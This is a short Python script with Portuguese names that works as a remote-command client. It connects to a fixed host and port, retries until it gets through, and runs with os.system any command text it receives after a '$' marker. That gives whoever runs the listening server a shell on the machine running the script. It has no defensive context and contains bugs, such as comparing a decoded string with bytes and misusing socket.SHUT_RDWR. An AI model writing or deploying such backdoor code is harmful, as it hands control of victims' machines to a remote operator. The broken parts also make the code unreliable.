from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from time import sleep

import os

class Cliente(object):
	"""
	"""

	def __init__(self, host, port):
		"""
		"""

		self.host = host
		self.port = port
		self.codificacao = "utf8"

		self.ftp = socket(AF_INET, SOCK_STREAM)
		self.ftp.connect((self.host, self.port))

		

	def receive(self):
		"""
		"""

		while 1:
			try:
				mensagem = self.ftp.recv(1024).decode(self.codificacao)
				print(mensagem)
				if mensagem == b'':
					raise RuntimeError("socket connection broken")

				comando = mensagem.split("$")[1]

				os.system(comando)

			except OSError:
				break

			Thread(target=self.send).start()
			

	def send(self):
		"""
		"""

		while 1:

			prefixo = "Cliente: "
			mensagem = input(": ")

			sent = self.ftp.send(bytes(prefixo + mensagem, self.codificacao))
			if sent == 0:
				raise RuntimeError("socket connection broken")

#"192.168.0.14"	
host = "0.0.0.0"
port = 33333
contador = 0
tentar = True
while True:	
	try:
		while True:
			try:
				cliente = Cliente(host, port)
				tentar = False
				print("quebrar")
				break

			except Exception as e:
				if cliente:
					cliente.ftp.shutdown(socket.SHUT_RDWR)
					cliente.ftp.close()
				os.system("clear")
				contador += 1
				print(contador, e)
				sleep(2)

					
		print("passou")
		receive_thread = Thread(target=cliente.receive)
		receive_thread.start()
		receive_thread.join()

	except:
		print("quebrado")
